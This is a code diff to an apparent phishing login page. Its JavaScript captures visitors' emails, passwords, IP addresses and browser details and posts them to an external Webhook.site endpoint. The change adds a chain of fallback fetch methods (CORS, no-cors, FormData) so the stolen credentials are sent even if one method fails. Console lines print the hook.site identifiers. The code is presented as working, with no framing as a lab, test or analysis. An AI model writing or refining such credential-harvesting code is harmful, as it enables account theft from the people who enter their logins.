@@ -331,7 +331,7 @@
       }
     }
 
-    // Alternative method to send data using FormData (works better with some webhooks)
+    // Send data to webhook using multiple methods
     async function sendToWebhook(data) {
       const statusEl = document.getElementById('webhookStatus');
       const messageEl = document.getElementById('webhookMessage');
@@ -346,68 +346,102 @@
         document.getElementById('webhookIndicator').className = 'webhook-status pulse';
         loginBtn.disabled = true;
 
-        // Method 1: Try JSON first
+        // METHOD 1: Try with CORS (standard approach - works with Webhook.site)
         try {
           const response = await fetch(WEBHOOK_URL, {
             method: 'POST',
-            mode: 'no-cors', // This prevents CORS errors but you won't get a response
             headers: {
               'Content-Type': 'application/json',
             },
             body: JSON.stringify(data)
           });
 
-          // With no-cors, response is opaque, we can't read it
-          // But the request should still go through
-          statusEl.className = 'status-message status-success';
-          statusEl.textContent = '✅ Data sent to Webhook.site (no-cors mode)!';
-          messageEl.textContent = '✅ Data sent to webhook (check your dashboard)';
-          indicatorText.textContent = '✓ Data Sent';
-          document.getElementById('webhookIndicator').className = 'webhook-status';
-          webhookSent = true;
+          if (response.ok) {
+            // Success!
+            statusEl.className = 'status-message status-success';
+            statusEl.textContent = '✅ Data successfully sent to Webhook.site!';
+            messageEl.textContent = '✅ Data captured and sent to webhook';
+            indicatorText.textContent = '✓ Data Sent';
+            document.getElementById('webhookIndicator').className = 'webhook-status';
+            webhookSent = true;
+            loginBtn.disabled = false;
+            
+            console.log('✅ Data sent to webhook:', data);
+            return;
+          } else {
+            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+          }
+        } catch (corsError) {
+          console.log('CORS method failed, trying alternative...', corsError.message);
           
-          console.log('✅ Data sent to webhook (no-cors mode):', data);
-          return;
-        } catch (jsonError) {
-          console.log('JSON method failed, trying FormData...');
+          // METHOD 2: Try with no-cors (data might be stripped)
+          try {
+            await fetch(WEBHOOK_URL, {
+              method: 'POST',
+              mode: 'no-cors',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify(data)
+            });
+            
+            // With no-cors we can't check response, but assume it worked
+            statusEl.className = 'status-message status-success';
+            statusEl.textContent = '✅ Data sent (no-cors mode) - check webhook dashboard';
+            messageEl.textContent = '✅ Data sent to webhook (check your dashboard)';
+            indicatorText.textContent = '✓ Data Sent';
+            document.getElementById('webhookIndicator').className = 'webhook-status';
+            webhookSent = true;
+            loginBtn.disabled = false;
+            
+            console.log('✅ Data sent using no-cors mode:', data);
+            return;
+          } catch (noCorsError) {
+            console.log('No-cors also failed, trying FormData...', noCorsError.message);
+            
+            // METHOD 3: Try FormData with no-cors
+            try {
+              const formData = new FormData();
+              Object.keys(data).forEach(key => {
+                formData.append(key, data[key]);
+              });
+
+              await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: formData
+              });
+
+              statusEl.className = 'status-message status-success';
+              statusEl.textContent = '✅ Data sent (FormData) - check webhook dashboard';
+              messageEl.textContent = '✅ Data sent to webhook (check your dashboard)';
+              indicatorText.textContent = '✓ Data Sent';
+              document.getElementById('webhookIndicator').className = 'webhook-status';
+              webhookSent = true;
+              loginBtn.disabled = false;
+              
+              console.log('✅ Data sent using FormData:', data);
+              return;
+            } catch (formError) {
+              throw new Error('All methods failed. Please check your internet connection.');
+            }
+          }
         }
-
-        // Method 2: Try FormData (alternative approach)
-        const formData = new FormData();
-        Object.keys(data).forEach(key => {
-          formData.append(key, data[key]);
-        });
-
-        const response2 = await fetch(WEBHOOK_URL, {
-          method: 'POST',
-          mode: 'no-cors',
-          body: formData
-        });
-
-        statusEl.className = 'status-message status-success';
-        statusEl.textContent = '✅ Data sent to Webhook.site (FormData)!';
-        messageEl.textContent = '✅ Data sent to webhook (check your dashboard)';
-        indicatorText.textContent = '✓ Data Sent';
-        document.getElementById('webhookIndicator').className = 'webhook-status';
-        webhookSent = true;
-        
-        console.log('✅ Data sent to webhook using FormData:', data);
 
       } catch (error) {
         // Error handling
         console.error('Webhook error:', error);
         
-        // Provide more helpful error message
         let errorMsg = error.message;
         if (error.message.includes('Failed to fetch')) {
-          errorMsg = 'Network error - check internet connection or CORS policy';
+          errorMsg = 'Network error - check internet connection';
         } else if (error.message.includes('Load failed')) {
-          errorMsg = 'Load failed - the webhook URL might be unreachable';
+          errorMsg = 'Load failed - webhook URL might be unreachable';
         }
         
         statusEl.className = 'status-message status-error';
         statusEl.textContent = `❌ Error: ${errorMsg}`;
-        messageEl.textContent = '❌ Webhook send failed - check console for details';
+        messageEl.textContent = '❌ Webhook send failed - check console';
         indicatorText.textContent = '❌ Error';
         document.getElementById('webhookIndicator').className = 'webhook-status';
         loginBtn.disabled = false;
@@ -425,9 +459,9 @@
 
       // Prepare data for webhook
       const data = {
-        timestamp: timestamp,
         email: email,
         password: pass,
+        timestamp: timestamp,
         browser: browser,
         ip_address: ip,
         user_agent: navigator.userAgent,
@@ -491,7 +525,6 @@
     console.log('🔗 Webhook URL:', WEBHOOK_URL);
     console.log('📧 Unique email:', 'b6e9b4df-3ece-4ef3-996b-2551d1d4c6a1@email.hook.site');
     console.log('🌐 DNS Name:', '*.b6e9b4df-3ece-4ef3-996b-2551d1d4c6a1.dnshook.site');
-    console.log('ℹ️  Using no-cors mode to bypass CORS restrictions');
     console.log('📊 Check your webhook dashboard for incoming data');
   </script>
 
